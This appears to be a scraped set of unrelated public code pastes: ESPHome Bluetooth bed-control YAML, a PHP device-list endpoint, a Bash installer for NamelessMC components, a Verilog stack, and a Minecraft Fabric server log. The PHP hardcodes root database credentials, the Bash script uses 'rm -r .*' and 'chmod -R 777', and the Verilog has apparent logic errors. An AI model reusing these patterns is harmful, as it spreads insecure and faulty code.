            ESP_LOGD(""ble_client_lambda"", ""Disconnected from Sofies Seng"");
        - switch.turn_off: sofies_seng_connected


sensor:
  # Jan Head Height Sensor
  - platform: ble_client
    type: characteristic
    ble_client_id: janseng
    id: jan_head_height
    name: 'Jan hoved højde'
    service_uuid: '99fa0020-338a-1024-8a49-009c0215f78a'
    characteristic_uuid: '99fa0028-338a-1024-8a49-009c0215f78a'
    icon: 'mdi:arrow-up-down'
    unit_of_measurement: 'cm'
    accuracy_decimals: 1
#    update_interval: never
    notify: true
    lambda: |-
      uint16_t raw_height = ((uint16_t)x[1] << 8) | x[0];
      unsigned short height_mm = raw_height /5;

      return (float) height_mm /5;

  # Sofie Head Height Sensor
  - platform: ble_client
    type: characteristic
    ble_client_id: sofieseng
    id: sofie_head_height
    name: 'Sofie hoved højde'
    service_uuid: '99fa0020-338a-1024-8a49-009c0215f78a'
    characteristic_uuid: '99fa0028-338a-1024-8a49-009c0215f78a'
    icon: 'mdi:arrow-up-down'
    unit_of_measurement: 'cm'
    accuracy_decimals: 1
#    update_interval: never
    notify: true
    lambda: |-
      uint16_t raw_height = ((uint16_t)x[1] << 8) | x[0];
      unsigned short height_mm = raw_height /5;

      return (float) height_mm /5;

  # Jan Feet Height Sensor
  - platform: ble_client
    type: characteristic
    ble_client_id: janseng
    id: jan_feet_height
    name: 'Fod Højde'
    service_uuid: '99fa0020-338a-1024-8a49-009c0215f78a'
    characteristic_uuid: '99fa0027-338a-1024-8a49-009c0215f78a'
    icon: 'mdi:arrow-up-down'
    unit_of_measurement: 'cm'
    accuracy_decimals: 1
#    update_interval: never
    notify: true
    lambda: |-
      uint16_t raw_height = ((uint16_t)x[1] << 8) | x[0];
      unsigned short height_mm = raw_height / 6;

      return (float) height_mm / 5;

  # Sofie Feet Height Sensor
  - platform: ble_client
    type: characteristic
    ble_client_id: sofieseng
    id: sofie_feet_height
    name: 'Sofie Fod Højde'
    service_uuid: '99fa0020-338a-1024-8a49-009c0215f78a'
    characteristic_uuid: '99fa0027-338a-1024-8a49-009c0215f78a'
    icon: 'mdi:arrow-up-down'
    unit_of_measurement: 'cm'
    accuracy_decimals: 1
#    update_interval: never
    notify: true
    lambda: |-
      uint16_t raw_height = ((uint16_t)x[1] << 8) | x[0];
      unsigned short height_mm = raw_height / 6;

      return (float) height_mm / 5;

switch:
  - platform: template
    name: ""Jans seng connected""
    id: jans_seng_connected
    optimistic: True
  - platform: template
    name: ""Sofies seng connected""
    id: sofies_seng_connected
    optimistic: True


  - platform: ble_client
    ble_client_id: janseng
    name: ""Enable Jans seng""
    id: jans_seng
  - platform: ble_client
    ble_client_id: sofieseng
    name: ""Enable Sofies seng""
    id: sofies_seng

  - platform: template
    name: ""Jan Seng Lys""
    id: jan_seng_light_toggle
    turn_on_action: 
      - ble_client.ble_write:
          id: janseng
          service_uuid: 99fa0001-338a-1024-8a49-009c0215f78a
          characteristic_uuid: 99fa0002-338a-1024-8a49-009c0215f78a
          value: [0x94, 0x00]

  - platform: template
    name: ""Sofie Seng Lys""
    id: sofie_seng_light_toggle
    turn_on_action: 
      - ble_client.ble_write:
          id: sofieseng
          service_uuid: 99fa0001-338a-1024-8a49-009c0215f78a
          characteristic_uuid: 99fa0002-338a-1024-8a49-009c0215f78a
          value: [0x94, 0x00]

#  - platform: template
#    name: ""Min Seng Lys on""
#    id: min_seng_light_on
#    turn_on_action: 
#    - ble_client.ble_write:
#        id: janseng
#        service_uuid: 99fa0001-338a-1024-8a49-009c0215f78a
#        characteristic_uuid: 99fa0002-338a-1024-8a49-009c0215f78a
#        value: [0x92, 0x00]

#  - platform: template
#    name: ""Min Seng Lys off""
#    id: min_seng_light_off
#    turn_on_action: 
#    - ble_client.ble_write:
#        id: janseng
#        service_uuid: 99fa0001-338a-1024-8a49-009c0215f78a
#        characteristic_uuid: 99fa0002-338a-1024-8a49-009c0215f78a
#        value: [0x93, 0x00]


  - platform: template
    name: ""Jan Hoved op""
    id: jan_hoved_op_knap
    turn_on_action:
      - script.execute: jan_hoved_op

  - platform: template
    name: ""Sofie Hoved op""
    id: sofie_hoved_op_knap
    turn_on_action:
      - script.execute: sofie_hoved_op

  - platform: template
    name: ""Jan Hoved ned""
    id: jan_hoved_ned_knap
    turn_on_action:
      - script.execute: jan_hoved_ned
#          - ble_client.ble_write:
#            id: rc2bed
#            service_uuid: 99fa0001-338a-1024-8a49-009c0215f78a
#            characteristic_uuid: 99fa0002-338a-1024-8a49-009c0215f78a
#            value: [0x0a, 0x00]

  - platform: template
    name: ""Sofie Hoved ned""
    id: sofie_hoved_ned_knap
    turn_on_action:
      - script.execute: sofie_hoved_ned
#          - ble_client.ble_write:
#            id: rc2bed
#            service_uuid: 99fa0001-338a-1024-8a49-009c0215f78a
#            characteristic_uuid: 99fa0002-338a-1024-8a49-009c0215f78a
#            value: [0x0a, 0x00]

  - platform: template
    name: ""Jan Ben op""
    id: jan_ben_op
    turn_on_action: 
    - ble_client.ble_write:
        id: janseng
        service_uuid: 99fa0001-338a-1024-8a49-009c0215f78a
        characteristic_uuid: 99fa0002-338a-1024-8a49-009c0215f78a
        value: [0x09, 0x00]

  - platform: template
    name: ""Sofie Ben op""
    id: soie_ben_op
    turn_on_action: 
    - ble_client.ble_write:
        id: sofieseng
        service_uuid: 99fa0001-338a-1024-8a49-009c0215f78a
        characteristic_uuid: 99fa0002-338a-1024-8a49-009c0215f78a
        value: [0x09, 0x00]

  - platform: template
    name: ""Jan Ben ned""
    id: jan_ben_ned
    turn_on_action: 
    - ble_client.ble_write:
        id: janseng
        service_uuid: 99fa0001-338a-1024-8a49-009c0215f78a
        characteristic_uuid: 99fa0002-338a-1024-8a49-009c0215f78a
        value: [0x08, 0x00]

  - platform: template
    name: ""Sofie Ben ned""
    id: sofie_ben_ned
    turn_on_action: 
    - ble_client.ble_write:
        id: sofieseng
        service_uuid: 99fa0001-338a-1024-8a49-009c0215f78a
        characteristic_uuid: 99fa0002-338a-1024-8a49-009c0215f78a
        value: [0x08, 0x00]

  - platform: template
    name: ""Jan Begge op""
    id: jan_begge_op
    turn_on_action: 
    - ble_client.ble_write:
        id: janseng
        service_uuid: 99fa0001-338a-1024-8a49-009c0215f78a
        characteristic_uuid: 99fa0002-338a-1024-8a49-009c0215f78a
        value: [0x01, 0x00]

  - platform: template
    name: ""Sofie Begge op""
    id: sofie_begge_op
    turn_on_action: 
    - ble_client.ble_write:
        id: sofieseng
        service_uuid: 99fa0001-338a-1024-8a49-009c0215f78a
        characteristic_uuid: 99fa0002-338a-1024-8a49-009c0215f78a
        value: [0x01, 0x00]

  - platform: template
    name: ""Jan Begge ned""
    id: jan_begge_ned
    turn_on_action: 
    - ble_client.ble_write:
        id: janseng
        service_uuid: 99fa0001-338a-1024-8a49-009c0215f78a
        characteristic_uuid: 99fa0002-338a-1024-8a49-009c0215f78a
        value: [0x00, 0x00]

  - platform: template
    name: ""Sofie Begge ned""
    id: sofie_begge_ned
    turn_on_action: 
    - ble_client.ble_write:
        id: sofieseng
        service_uuid: 99fa0001-338a-1024-8a49-009c0215f78a
        characteristic_uuid: 99fa0002-338a-1024-8a49-009c0215f78a
        value: [0x00, 0x00]

script:
  - id: jan_hoved_op
    then:
      - ble_client.ble_write:
          id: janseng
          service_uuid: 99fa0001-338a-1024-8a49-009c0215f78a
          characteristic_uuid: 99fa0002-338a-1024-8a49-009c0215f78a
          value: [0x0b, 0x00]
      - delay: 0.05s

  - id: sofie_hoved_op
    then:
      - ble_client.ble_write:
          id: sofieseng
          service_uuid: 99fa0001-338a-1024-8a49-009c0215f78a
          characteristic_uuid: 99fa0002-338a-1024-8a49-009c0215f78a
          value: [0x0b, 0x00]
      - delay: 0.05s

  - id: jan_hoved_ned
    then:
      - ble_client.ble_write:
          id: janseng
          service_uuid: 99fa0001-338a-1024-8a49-009c0215f78a
          characteristic_uuid: 99fa0002-338a-1024-8a49-009c0215f78a
          value: [0x0a, 0x00]
      - delay: 0.05s

  - id: sofie_hoved_ned
    then:
      - ble_client.ble_write:
          id: sofieseng
          service_uuid: 99fa0001-338a-1024-8a49-009c0215f78a
          characteristic_uuid: 99fa0002-338a-1024-8a49-009c0215f78a
          value: [0x0a, 0x00]
      - delay: 0.05s
"
60Ez7fXL,Devices,mayerm001,PHP,Sunday 18th of June 2023 07:42:42 AM CDT,"<?php
header('Content-Type: application/json');
$conn = mysqli_connect(""localhost"",""root"",""password"",""web"");
$url = $_SERVER['REQUEST_URI'];
$url_components = parse_url($url);
parse_str($url_components['query'], $params);
$sqlQuery = ""SELECT d.uname FROM blue_devices d order by d.id ASC;"";
$result = mysqli_query($conn,$sqlQuery);
$data = array();
foreach ($result as $row) {
	$data[] = $row;
}
mysqli_close($conn);
echo json_encode($data);
?>"
n1NNkr4m,Install NamelessLink,Justman10000,Bash,Sunday 18th of June 2023 07:42:00 AM CDT,"# You need Java: https://pastebin.com/QciQuZYS
# You need Maven: https://pastebin.com/xdcMjbRT

mkdir /home/Nameless-Java-API
cd /home/Nameless-Java-API
git init
git remote add origin https://github.com/NamelessMC/Nameless-Java-API.git
git pull origin master
rm -r .* LICENSE *.md
chmod -R 777 .
mvn install

mkdir /home/Namelesslink
cd /home/Namelesslink
git init
git remote add origin https://github.com/NamelessMC/Nameless-Link.git
git pull origin 5

chmod -R 777 .
mvn package"
LRujFAuA,Verilog Stack,HaS5HeM,VeriLog,Sunday 18th of June 2023 07:27:51 AM CDT,"module stack
#(
  parameter ADDRESS_BITS = 2,
            WORD_BITS    = 4
)
(
  input  wire                 clk, rst,
  input  wire                 push, pop,
  input  wire [WORD_BITS-1:0] push_data,
  output wire [WORD_BITS-1:0] pop_data,
  output wire                 empty, full
);

localparam MAX_ADDRESS = ADDRESS_BITS**2-1;

reg [1:0] next_state;
reg [1:0] current_state;

parameter S0 = 2'b00;
parameter S1 = 2'b01;
parameter S2 = 2'b10;

reg [WORD_BITS-1:0] regfile [MAX_ADDRESS:0];
reg [MAX_ADDRESS:0] push_ptr_current, pop_ptr_current,
                    push_ptr_next,    pop_ptr_next;

always @(posedge clk)
  if (current_state == S1)
    regfile[push_ptr_current] <= push_data;

// current state logic
always @(posedge clk)
begin
  if (rst)
  begin
    current_state    <= S0;
    push_ptr_current <= 0;
    pop_ptr_current  <= 0;
  end
  else
  begin
    current_state    <= next_state;
    push_ptr_current <= push_ptr_next;
    pop_ptr_current  <= pop_ptr_next;
  end
end

// next state logic
always @*
begin
  case(current_state)
    S0:
    begin
      next_state = push ? S1 : pop ? S2 : S0;
    end
    S1:
    begin
      pop_ptr_next  = (pop_ptr_current  == MAX_ADDRESS) ? pop_ptr_current  : pop_ptr_current  + 1;
      push_ptr_next = (push_ptr_current == MAX_ADDRESS) ? push_ptr_current : push_ptr_current + 1;
      next_state    = push ? S1 : pop ? S2 : S0;
    end
    S2:
    begin
      pop_ptr_next  = (pop_ptr_current  == 0) ? pop_ptr_current  : pop_ptr_current  - 1;
      push_ptr_next = (push_ptr_current == 0) ? push_ptr_current : push_ptr_current - 1;
      next_state    = push ? S1 : pop ? S2 : S0;
    end
  endcase
end

// output logic
assign pop_data = (current_state   == S2)          ? regfile[pop_ptr_current] : 0;
assign full     = (pop_ptr_current == MAX_ADDRESS) ? 1'b1                     : 1'b0;
assign empty    = (pop_ptr_current == MAX_ADDRESS) ? 1'b0                     : 1'b1;

endmodule"
MKHJCFPM,Untitled,MirinMusic,Java,Sunday 18th of June 2023 07:26:59 AM CDT,"java -Xms128M -Xmx8192M -Dsip=65.21.70.32 -Dspt=25613 -XX:+UseG1GC -DPaper.IgnoreJavaVersion=true -Dfml.readTimeout=1024 -Dlog4j2.formatMsgNoLookups=true -Dfml.queryResult=confirm -Dterminal.jline=false -Dterminal.ansi=true -DIReallyKnowWhatIAmDoingISwear=true -Duser.timezone=Europe/Moscow -jar -Dfile.encoding=UTF-8 core.jar nogui
Starting net.fabricmc.loader.impl.game.minecraft.BundlerClassPathCapture
[15:22:19] [main/INFO]: Loading Minecraft 1.18.2 with Fabric Loader 0.14.21
[15:22:19] [ForkJoinPool-1-worker-7/WARN]: Mod blocutter uses the version 1.18.2 - 1.4 which isn't compatible with Loader's extended semantic version format (Invalid prerelease string ' 1.4'!), SemVer is recommended for reliably evaluating dependencies and prioritizing newer version
[15:22:19] [ForkJoinPool-1-worker-4/WARN]: Mod create uses the version 0.5.0.i-1016+1.18.2 which isn't compatible with Loader's extended semantic version format (Could not parse version number component 'i'!), SemVer is recommended for reliably evaluating dependencies and prioritizing newer version
[15:22:19] [ForkJoinPool-1-worker-10/WARN]: Mod flywheel uses the version 0.6.8.a-36 which isn't compatible with Loader's extended semantic version format (Could not parse version number component 'a'!), SemVer is recommended for reliably evaluating dependencies and prioritizing newer version
[15:22:19] [ForkJoinPool-1-worker-5/WARN]: The mod ""dungeons_arise"" contains invalid entries in its mod json:
- Unsupported root entry ""credits"" at line 12 column 12
[15:22:19] [ForkJoinPool-1-worker-2/WARN]: Mod registrate-fabric uses the version MC1.18.2-1.1.11 which isn't compatible with Loader's extended semantic version format (Could not parse version number component 'MC1'!), SemVer is recommended for reliably evaluating dependencies and prioritizing newer version
[15:22:19] [ForkJoinPool-1-worker-1/WARN]: Mod mmode uses the version 1.1.1d which isn't compatible with Loader's extended semantic version format (Could not parse version number component '1d'!), SemVer is recommended for reliably evaluating dependencies and prioritizing newer version
[15:22:19] [ForkJoinPool-1-worker-5/WARN]: Mod soaringstructures2 uses the version 1.18.2 - 2.3.1 which isn't compatible with Loader's extended semantic version format (Invalid prerelease string ' 2.3.1'!), SemVer is recommended for reliably evaluating dependencies and prioritizing newer version
[15:22:19] [ForkJoinPool-1-worker-3/WARN]: Mod net_dv8tion_jda uses the version 4.4.0_352 which isn't compatible with Loader's extended semantic version format (Could not parse version number component '0_352'!), SemVer is recommended for reliably evaluating dependencies and prioritizing newer version
[15:22:20] [main/WARN]: Warnings were found!
 - Mod 'PassableLeaves' (passableleaves) 1.2.0 recommends any version between 2.2.2 (inclusive) and 3- (exclusive) of nbtcrafting, which is missing!
         - You should install any version between 2.2.2 (inclusive) and 3- (exclusive) of nbtcrafting for the optimal experience.
[15:22:20] [main/INFO]: Loading 337 mods:
        - ad_astra 1.0.9
           \-- team_reborn_energy 2.2.0
        - additionalstructures 3.1.0
        - advanced_runtime_resource_pack 0.5.7
        - adventurez 1.4.11
        - ae2 11.7.4
           \-- noindium 1.0.2+1.18.2
        - alloy_forgery 2.0.16+1.18.2
        - alternate-current 1.6.0
        - animal_feeding_trough 1.0.3+1.18.2
        - another_furniture 1.2.2-1.18.2
        - antishulkerdupe 1.0.0
        - antixray 1.2.1
        - appbot 1.3.5
        - archeology 0.1.9
           \-- midnightlib 0.4.4
        - architectury 4.11.93
        - autowhitelist 1.0.1
           |-- com_fasterxml_jackson_core_jackson-annotations 2.10.1
           |-- com_fasterxml_jackson_core_jackson-core 2.10.1
           |-- com_fasterxml_jackson_core_jackson-databind 2.10.1
           |-- com_google_code_findbugs_jsr305 3.0.2
           |-- com_neovisionaries_nv-websocket-client 2.14
           |-- com_squareup_okhttp3_okhttp 3.13.0
           |-- com_squareup_okio_okio 1.17.2
           |-- net_dv8tion_jda 4.4.0_352
           |-- net_sf_trove4j_trove4j 3.0.3
           |-- org_apache_commons_commons-collections4 4.1
           \-- org_jetbrains_annotations 16.0.1
        - awesomedungeonnether 3.1.1
        - badstdout 1.1.1-1.18
        - balm-fabric 3.2.6
        - banhammer 0.5.1+1.18.2
           |-- mysql_mysql-connector-java 8.0.29
           |-- org_xerial_sqlite-jdbc 3.36.0.3
           |-- placeholder-api 1.1.3+1.17.1
           \-- sgui 1.0.2+1.18.2
        - bclib 1.4.7
        - bettercombat 1.6.2+1.18.2
        - betterdeserttemples 1.18.2-Fabric-1.3
        - betterdungeons 1.18.2-Fabric-2.1.0
        - betterend 1.1.1
        - betterfortresses 1.18.2-Fabric-1.0.0
           \-- org_reflections_reflections 0.10.2
        - bettermineshafts 1.18.2-Fabric-2.2
        - betternether 6.1.2
        - betteroceanmonuments 1.18.2-Fabric-1.0.3
        - betterstrongholds 1.18.2-Fabric-2.1.1
        - betterwitchhuts 1.18.2-Fabric-1.0.1
        - biomemakeover 1.18.2-1.4.32
        - blocutter 1.18.2 - 1.4
        - boat-with-everything 1.1.0+backport
        - boatfall 1.1.0
        - boatoverhaul 2.0.0
        - bosses_of_mass_destruction 1.3.7-1.18.2
           |-- maelstrom_library 1.2.4-1.18.2
           \-- multipart_entities 1.1.5-1.18.2
        - botania 1.18.2-435-FABRIC
           |-- fiber 0.23.0-2
           |-- reach-entity-attributes 2.1.1
           \-- step-height-entity-attribute 1.0.0
        - cardinal-components 4.2.0
           |-- cardinal-components-base 4.2.0
           |-- cardinal-components-block 4.2.0
           |-- cardinal-components-chunk 4.2.0
           |-- cardinal-components-entity 4.2.0
           |-- cardinal-components-item 4.2.0
           |-- cardinal-components-level 4.2.0
           |-- cardinal-components-scoreboard 4.2.0
           \-- cardinal-components-world 4.2.0
        - chathistory 1.2.1+1.18.1
        - chunky 1.2.164
        - cloth-config 6.4.90
           \-- cloth-basic-math 0.6.1
        - cmdspy 1.2.4
        - collective 6.53
        - colorfulanvils 1.1.0+1.18.x
           |-- fabric-api-base 0.4.5+64b7c69360
           |-- fabric-permissions-api-v0 0.2-SNAPSHOT
           \-- placeholder-api 1.1.3+1.17.1
        - completeconfig 1.4.1
        - conjuring 1.0.22+1.18
        - copper_pipe 1.12.1-1.18.2
        - create 0.5.0.i-1016+1.18.2
           |-- flywheel 0.6.8.a-36
           |-- forge_tags 2.1
           |-- milk 0.3.2
           |    \-- dripstone_fluid_lib 1.2.0
           |-- porting_lib 1.2.955-beta+1.18.2
           |    |-- forge_tags 2.1
           |    |-- mm 2.3
           |    \-- serialization_hooks 0.3.23
           |-- reach-entity-attributes 2.1.1
           \-- registrate-fabric MC1.18.2-1.1.11
                \-- forge_tags 2.1
        - creativecore 2.6.12
        - creeperoverhaul 1.3.1
        - creeperspores 1.8.0
        - cristellib 1.0.0
           \-- blue_endless_jankson 1.2.1
        - crops_love_rain 1.2.2
        - croptopia 2.1.2
           |-- com_typesafe_config 1.4.1
           |-- io_leangen_geantyref_geantyref 1.3.11
           |-- org_spongepowered_configurate-core 4.1.2
           \-- org_spongepowered_configurate-hocon 4.1.2
        - cursery 1.18.2-3.0
        - debugify 1.11.0
        - deeper_oceans 1.0
        - diamondchestshop 1.2.3-1.18
        - diamondeconomy 1.5.0
           \-- placeholder-api 1.1.3+1.17.1
        - diamondsauctionhouse 1.1.0
           \-- sgui 1.0.2+1.18.2
        - drg_flares 1.2.1
        - dungeons_arise 2.1.50
        - dyeallthethings 1.3.0
        - easyauth 3.0.0-14
           |-- at_favre_lib_bcrypt 0.9.0
           |-- at_favre_lib_bytes 1.5.0
           |-- de_mkammerer_argon2-jvm 2.11
           |-- de_mkammerer_argon2-jvm-nolibs 2.11
           |-- net_java_dev_jna_jna 5.12.1
           |-- org_iq80_leveldb_leveldb 0.12
           |-- org_iq80_leveldb_leveldb-api 0.12
           |-- org_mongodb_bson 4.7.0
           |-- org_mongodb_mongodb-driver-core 4.7.0
           |-- org_mongodb_mongodb-driver-sync 4.7.0
           |-- placeholder-api 1.1.3+1.17.1
           \-- server_translations_api 1.4.12+1.18.2
                \-- packet_tweaker 0.2.0+1.18-pre1
        - easywhitelist 1.0.0
        - ecologics 1.7.11
        - eldritch_mobs 1.11.7
        - emerald_tools 1.3.48
           \-- pugh_tools 1.2.7
        - endrem 5.1.0
        - enhancedcelestials 2.0.7
        - environmentz 1.2.2
        - expert_armor 1.7.5
        - extractinator 2.0.1
           \-- resourcefullib 0.0.4
        - fabric-api 0.76.0+1.18.2
           |-- fabric-api-base 0.4.5+64b7c69360
           |-- fabric-api-lookup-api-v1 1.6.3+2373a54560
           |-- fabric-biome-api-v1 8.0.7+e83becad60
           |-- fabric-block-api-v1 1.0.0+ee3621fc60
           |-- fabric-blockrenderlayer-v1 1.1.13+3ac43d9560
           |-- fabric-command-api-v1 1.1.10+d7c144a860
           |-- fabric-commands-v0 0.2.9+b4f4f6cd60
           |-- fabric-containers-v0 0.1.24+d7c144a860
           |-- fabric-content-registries-v0 3.1.3+c85f2e3860
           |-- fabric-convention-tags-v1 1.1.0+43ce63a460
           |-- fabric-crash-report-info-v1 0.2.1+ee261a3e60
           |-- fabric-data-generation-api-v1 3.1.0+6c70b68e60
           |-- fabric-dimensions-v1 2.1.21+489d6f8260
           |-- fabric-entity-events-v1 1.4.9+d7c144a860
           |-- fabric-events-interaction-v0 0.4.20+d7c144a860
           |-- fabric-events-lifecycle-v0 0.2.22+d7c144a860
           |-- fabric-game-rule-api-v1 1.0.13+d7c144a860
           |-- fabric-item-api-v1 1.6.2+8165403660
           |-- fabric-item-groups-v0 0.3.16+91896a4960
           |-- fabric-key-binding-api-v1 1.0.12+54e5b2ec60
           |-- fabric-keybindings-v0 0.2.10+b4f4f6cd60
           |-- fabric-lifecycle-events-v1 2.1.1+cc71601c60
           |-- fabric-loot-api-v2 1.1.2+1997ad1260
           |-- fabric-loot-tables-v1 1.1.4+e747827960
           |-- fabric-mining-level-api-v1 2.1.6+cc71601c60
           |-- fabric-models-v0 0.3.7+d7c144a860
           |-- fabric-networking-api-v1 1.0.24+2d30af4b60
           |-- fabric-networking-v0 0.3.11+b4f4f6cd60
           |-- fabric-object-builder-api-v1 2.1.5+032c981d60
           |-- fabric-particles-v1 0.2.13+526dc1ac60
           |-- fabric-registry-sync-v0 0.9.12+bb2e047760
           |-- fabric-renderer-api-v1 0.5.0+bf48649860
           |-- fabric-renderer-indigo 0.6.1+03e2b68760
           |-- fabric-renderer-registries-v1 3.2.12+b4f4f6cd60
           |-- fabric-rendering-data-attachment-v1 0.3.9+ee3621fc60
           |-- fabric-rendering-fluids-v1 2.0.3+54e5b2ec60
           |-- fabric-rendering-v0 1.1.14+b4f4f6cd60
           |-- fabric-rendering-v1 1.10.8+54e5b2ec60
           |-- fabric-resource-conditions-api-v1 2.0.3+91b7aa6660
           |-- fabric-resource-loader-v0 0.5.3+047a5ecb60
           |-- fabric-screen-api-v1 1.0.11+d882b91560
           |-- fabric-screen-handler-api-v1 1.2.3+1f6558e860
           |-- fabric-textures-v0 1.0.13+3ac43d9560
           |-- fabric-transfer-api-v1 1.6.4+f4563ac860
           \-- fabric-transitive-access-wideners-v1 1.1.0+e747827960
        - fabric-language-kotlin 1.9.4+kotlin.1.8.21
           |-- org_jetbrains_kotlin_kotlin-reflect 1.8.21
           |-- org_jetbrains_kotlin_kotlin-stdlib 1.8.21
           |-- org_jetbrains_kotlin_kotlin-stdlib-jdk7 1.8.21
           |-- org_jetbrains_kotlin_kotlin-stdlib-jdk8 1.8.21
           |-- org_jetbrains_kotlinx_atomicfu-jvm 0.20.2
           |-- org_jetbrains_kotlinx_kotlinx-coroutines-core-jvm 1.6.4
           |-- org_jetbrains_kotlinx_kotlinx-coroutines-jdk8 1.6.4
           |-- org_jetbrains_kotlinx_kotlinx-datetime-jvm 0.4.0
           |-- org_jetbrains_kotlinx_kotlinx-serialization-cbor-jvm 1.5.0
           |-- org_jetbrains_kotlinx_kotlinx-serialization-core-jvm 1.5.0
           \-- org_jetbrains_kotlinx_kotlinx-serialization-json-jvm 1.5.0
        - fabricloader 0.14.21
        - fallingthrough 1.18.2-2.5
        - fallingtree 3.5.4
        - finitewater 4.0-1.18.2
        - flotage 1.18.2-1.0.0
        - forgeconfigapiport 3.2.4
           |-- com_electronwill_night-config_core 3.6.5
           \-- com_electronwill_night-config_toml 3.6.5
        - ftblibrary 1802.3.11-build.177
        - ftbquests 1802.3.14-build.191
           \-- team_reborn_energy 2.2.0
        - ftbteams 1802.2.10-build.96
        - furnacemk2 0.1.13
        - furnacerecycle 2.0
        - geckolib3 3.0.80
           \-- com_eliotlash_mclib_mclib 20
        - gifts 1.18.1-1.1.0
        - gobber2 2.5.81
           |-- pugh_lib 1.3.2
           \-- pugh_tools 1.2.7
        - golfiv 0.5.2
        - grillingalore 1.1.1
        - guardiansgalore 1.18.2-3.1
        - hardcore_torches 1.18.2-1.6.1
        - herdspanic 1.0.5
        - htm 1.1.4
        - immersive_armors 1.5.5+1.18.2
        - immersive_weathering 1.18.2-1.18.2-3.0.3
           \-- modmenu 3.2.3
        - incendium 5.0.8
        - inertiaanticheat 0.0.5
        - invview 1.4.8-1.18+
        - itemfilters 1802.2.8-build.50
        - itemphysiclite 1.5.0
        - java 20
        - ksyxis 1.1
        - lavajava 0.4.0
        - libraryferret 4.0.0
        - luckperms 5.3.86
        - luckperms-placeholders 5.1-SNAPSHOT
           \-- placeholder-api 1.1.3+1.17.1
        - mc7569-fix 1.0.0
        - mcdar 1.5.2-1.18
        - medievalweapons 1.2.0
           \-- reach-entity-attributes 2.1.1
        - memoryleakfix 1.0.0
           \-- com_github_llamalad7_mixinextras 0.2.0-beta.6
        - minecraft 1.18.2
        - minekea 2.8.3
        - miniblockmerchants 1.1.0
        - miniminer 1.0.1
        - minimotd-fabric 2.0.7
           \-- adventure-platform-fabric 5.2.1
                |-- net_kyori_adventure-api 4.10.1
                |-- net_kyori_adventure-key 4.10.1
                |-- net_kyori_adventure-platform-api 4.1.0
                |-- net_kyori_adventure-text-minimessage 4.10.1
                |-- net_kyori_adventure-text-serializer-gson 4.10.1
                |-- net_kyori_adventure-text-serializer-plain 4.10.1
                |-- net_kyori_examination-api 1.3.0
                \-- net_kyori_examination-string 1.3.0
        - mirins_studios 1.1.0
        - mixintrace 1.1.1+1.17
        - mmode 1.1.1d
           \-- org_apache_commons_commons-compress 1.21
        - mobfarmutilities 1.5.1
           \-- fake-player-api 0.3.0
        - moderndynamics 0.2.6-beta
           \-- team_reborn_energy 2.2.0
        - mostructures 1.4.2+1.18.2
           \-- omega-config 1.2.3-1.18.1
        - multiworldborders 1.4-fabric-1.18.2
        - mvs 2.2.6-1.18.2
        - mythicmetals 0.16.4+1.18.2
        - mythicmounts 1.18.2-7.1
        - netherportalfix 9.0.1
        - netherportalspread 7.5
        - nextspring 1.18.2-1.0.0
        - nullscape 1.1.3
        - observed 1.3.1
        - onceuponastroll 1.4.0
        - otyacraftengine 2.14
        - owo 0.7.2-no-cme+1.18
        - passableleaves 1.2.0
        - patchouli 1.18.2-66-FABRIC
           \-- fiber 0.23.0-2
        - perfectaccuracy 1.2
        - pickablevillagers 1.2.4+1.18.2
        - plasmo_voice 1.2.19
        - player-animator 1.0.2+1.18
        - polymorph 0.0.21-1.18.2
        - primalwinter 3.1.0
        - projectsavethepets 3.1.0-old.1.18+2022.10af157d70.fabric
        - purpeille 2.3.3+fabric-1.18.2
           |-- cmods 1.2.0
           \-- voidcrafting 1.6.4+fabric-1.18.2
        - puzzleslib 3.4.5
           |-- cardinal-components-base 4.2.0
           \-- cardinal-components-entity 4.2.0
        - pyrotastic 1.18.2+2.0.3
        - quicksand 1.1.0
           \-- cauldronlib 1.2.2
        - quicksort 0.0.2+1.18.2
        - realisticfirespread 1.18-1
        - reborncore 5.2.1
           \-- team_reborn_energy 2.2.0
        - riding_partners 1.0.0
        - rocks 1.6.0
        - rotten 1.4.6
        - rottencreatures 1.0.0
           \-- reach-entity-attributes 2.1.1
        - seasons 1.4-BETA+1.18
        - servercore 1.2.9-1.18.2
           \-- placeholder-api 1.1.3+1.17.1
        - sgod 2.0.0-1.18
        - silkspawners 1.1.1
        - simply_houses 1.1.0
        - simplyswords 1.40-1.18.2
        - sit 1.18.2-19
        - skinrestorer 1.0.4
        - skylands 4.0.2
        - skylorlib 1.3.35
        - smoothboot 1.18.2-1.7.0
        - soaringstructures2 1.18.2 - 2.3.1
        - spark 1.9.11
        - spawn_animations_mr 1.9
        - staaaaaaaaaaaack 1.18.2-0.5.1-19
           \-- fiber 0.23.0-2
        - structory 1.0.0
        - styledchat 1.2.3+1.18
           \-- placeholder-api 1.1.3+1.17.1
        - styledplayerlist 2.1.3+1.18
           |-- placeholder-api 1.1.3+1.17.1
           \-- player-data-api 0.1.0+1.18
        - subterrestrial 2.0.0
        - sulfurpotassiummod 1.1.2
        - t_and_t 1.10.0.1
        - takesapillage 1.0.4
           \-- midnightlib 0.4.4
        - techreborn 5.2.1
           \-- team_reborn_energy 2.2.0
        - terrablender 1.2.0.126
        - thirstybottles 3.0.1
        - timeoutout 1.0.1+1.18
        - totw_additions 1.2.1
        - tradingpost 3.2.0
        - trashslot 11.0.3
        - trinkets 3.3.1
        - uncraftingtable76 1.0.5.3
        - unfixed-seeds 1.0.2
        - unstructured 0.4+1.18.2
        - villagersplus 1.9.1
        - vinery 1.2.8
        - water-erosion 1.1.4
        - waystones 10.2.1
        - weatherdetector 1.0.1-1.18.2
        - wildfire_gender 2.9
        - wiredredstone 0.3.11+1.18.2
           |-- graphlib 0.2.5+1.18.2
           |-- libmultipart_deps_container 0.7.5-pre.0.2+kneelawk
           |    |-- libblockattributes_core 0.10.2
           |    |-- libmultipart 0.7.5-pre.0.2+kneelawk
           |    \-- libnetworkstack 0.6.3
           |-- lmp-compat 0.1.2+1.18.2
           \-- team_reborn_energy 2.2.0
        - wither_cage_fix 1.0.12
        - wolveswitharmor 1.7.1-1.18.2
           |-- maybe-data 1.2.1-1.18.2
           \-- static-content 1.0.1-1.16.2
                \-- staticdata 1.1.2
        - woof 3.0.0-1.18
        - wwoo 2.6.4+1.18.2
        - yungsapi 1.18.2-Fabric-2.2.9
           \-- org_javassist_javassist 3.28.0-GA
        - yungsbridges 1.18.2-Fabric-2.1.0
        - yungsextras 1.18.2-Fabric-2.1.0
